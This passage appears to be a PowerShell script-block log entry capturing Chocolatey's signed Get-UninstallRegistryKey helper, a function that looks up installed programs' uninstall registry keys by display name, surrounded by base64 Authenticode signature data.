ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPavSbp9dQ2siazYDp0Amg+EIr+hM9dp7a+0W # HNXStdkwDQYJKoZIhvcNAQEBBQAEggEASoaLXJSP8+kK99AO2/eLEtUgHMzrBxAl # 3VzBEO3yPsYgKkF2KgZc4+FheBMEUJmGnqnZXUzigSJFj2yuCX9drT9SLDxYlqLs # 7Ua4a7P+6qNOI+fv4RgzDpKhDIfLSyNtjfin2TUO6nnmCmKXBHHCGl6wT+3jXZZN # OrP0DRckft9wI+yARwZnsliyJJMJVyJ1HWiWQ1NBv1E8kxeHyiEvOKFWMU5Fxjcj # shLQenOBAQ0zgPgtO+1Mv7tVKPC/mPwz0XreiGzGdSz4BVdzNX8eqWTKAgBPj3Mq # bPOn+9cJalY+K0OXF0qjKx27oDqAJTgXt+XxHQVVUY1bwypkep6pZaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU2WjAjBgkqhkiG9w0BCQQxFgQUnLpFbpv40cF+T1dB # 0ypaJ3jlTSowDQYJKoZIhvcNAQEBBQAEggEALrngzN2q5JHS+d5l8DxExXPtlQNA # JAKNBwqX67SWFfNfkxNZMFGuFchaQdB0k9VI0jWjfw79y4ZstY4f30i0ejf2v1MI # wjk6Hb02leUalNfkLJ15/LVbIj5GVbqc/ozZca6//w2OEt1UOBIEtM3ouv+WOnXk # yFTtR9F7HK8MLWRSnQf1BGYxHqcV9oUGVQUkIj81FVXz/O0ZH6fZ21ZFl17OJ/Yo # T4MurhlQWXSGtEaBioiyMD+EUOlEF41qxzxorydfgg3Y+UHLtOayryak/AVggpi/ # F8NPHe/rwVBbXO28fjwtMdy/eyXD9cV+07qiarT2sJI6LZWqo7ag34qtVw== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Get-UninstallRegistryKey.ps1 ¦ ScriptBlockId: 9cf79b6b-78c4-4ca3-824e-37879fbacc1e ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2011 - 2017 RealDimensions Software, LLC # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-UninstallRegistryKey { <# .SYNOPSIS Retrieve registry key(s) for system-installed applications from an exact or wildcard search. .DESCRIPTION This function will attempt to retrieve a matching registry key for an already installed application, usually to be used with a chocolateyUninstall.ps1 automation script. The function also prevents `Get-ItemProperty` from failing when handling wrongly encoded registry keys. .NOTES Available in 0.9.10+. If you need to maintain compatibility with pre 0.9.10, please add the following to your nuspec (check for minimum version): ~~~xml <dependencies> <dependency id=""chocolatey-core.extension"" version=""1.1.0"" /> </dependencies> ~~~ .INPUTS String .OUTPUTS This function searches registry objects and returns an array of PSCustomObject with the matched key's properties. Retrieve properties with dot notation, for example: `$key.UninstallString` .PARAMETER SoftwareName Part or all of the Display Name as you see it in Programs and Features. It should be enough to be unique. The syntax follows the rules of the PowerShell `-like` operator, so the `*` character is interpreted as a wildcard, which matches any (zero or more) characters. If the display name contains a version number, such as ""Launchy (2.5)"", it is recommended you use a fuzzy search `""Launchy (*)""` (the wildcard `*`) so if Launchy auto-updates or is updated outside of Chocolatey, the uninstall script will not fail. Take care not to abuse fuzzy/glob pattern searches. Be conscious of programs that may have shared or common root words to prevent overmatching. For example, ""SketchUp*"" would match two keys with software names ""SketchUp 2016"" and ""SketchUp Viewer"" that are different programs released by the same company. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Version match: Software name is ""Gpg4Win (2.3.0)"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""Gpg4win (*)"" $key.UninstallString .EXAMPLE > # Fuzzy match: Software name is ""Launchy 2.5"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""Launchy*"" $key.UninstallString .EXAMPLE > # Exact match: Software name in Programs and Features is ""VLC media player"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""VLC media player"" $key.UninstallString .EXAMPLE > # Version match: Software name is ""SketchUp 2016"" # Note that the similar software name ""SketchUp Viewer"" would not be matched. [array]$key = Get-UninstallRegistryKey -SoftwareName ""SketchUp [0-9]*"" $key.UninstallString .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage .LINK Uninstall-ChocolateyPackage #> [CmdletBinding()] param( [parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)] [string] $softwareName, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($softwareName -eq $null -or $softwareName -eq '') { throw ""$SoftwareName cannot be empty for Get-UninstallRegistryKey"" } $ErrorActionPreference = 'Stop' $local_key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' $machine_key = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' $machine_key6432 = 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' Write-Verbose ""Retrieving all uninstall registry keys"" [array]$keys = Get-ChildItem -Path @($machine_key6432, $machine_key, $local_key) -ErrorAction SilentlyContinue Write-Debug ""Registry uninstall keys on system: $($keys.Count)"" Write-Debug ""Error handling check: `'Get-ItemProperty`' fails if a registry key is encoded incorrectly."" [int]$maxAttempts = $keys.Count for ([int]$attempt = 1; $attempt -le $maxAttempts; $attempt++) { [bool]$success = $false $keyPaths = $keys | Select-Object -ExpandProperty PSPath try { [array]$foundKey = Get-ItemProperty -Path $keyPaths -ErrorAction Stop | ? { $_.DisplayName -like $softwareName } $success = $true } catch { Write-Debug ""Found bad key."" foreach ($key in $keys){ try { Get-ItemProperty $key.PsPath > $null } catch { $badKey = $key.PsPath } } Write-Verbose ""Skipping bad key: $badKey"" [array]$keys = $keys | ? { $badKey -NotContains $_.PsPath } } if ($success) { break; } if ($attempt -ge 10) { Write-Warning ""Found 10 or more bad registry keys. Run command again with `'--verbose --debug`' for more info."" Write-Debug ""Each key searched should correspond to an installed program. It is very unlikely to have more than a few programs with incorrectly encoded keys, if any at all. This may be indicative of one or more corrupted registry branches."" } } if ($foundKey -eq $null -or $foundkey.Count -eq 0) { Write-Warning ""No registry key found based on '$softwareName'"" } Write-Debug ""Found $($foundKey.Count) uninstall registry key(s) with SoftwareName:`'$SoftwareName`'""; return $foundKey } Set-Alias Get-InstallRegistryKey Get-UninstallRegistryKey # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBES8sHzbRLLNcJ # 9iSdROLrD1zFWyfa5gBGwaNn1wzd16CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # 